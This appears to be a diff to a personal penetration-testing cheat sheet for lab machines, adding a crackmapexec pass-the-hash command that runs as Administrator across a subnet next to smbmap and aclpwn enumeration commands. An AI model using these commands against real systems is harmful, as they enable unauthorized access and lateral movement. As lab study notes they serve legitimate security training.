@@ -44,7 +44,8 @@ aclpwn -f svc-alfresco@htb.local -d htb.local --server 10.10.10.161 -du neo4j -d
 ### SMB
 #### anonymous share access
 `smbmap -u anonymous -H ip`
-
+#### crackmapexec
+`crackmapexec smb 10.11.1.0/24 -u Administrator -H aad3b435b51404eeaa35b51404ee:175A592F3B0C0C5F02FAD40C51412D3A --exec-method=smbexec --local-auth` 
 #### recursive all with depth 
 ```
 smbmap -u anonymous -H 10.10.10.130 -r --depth 5 
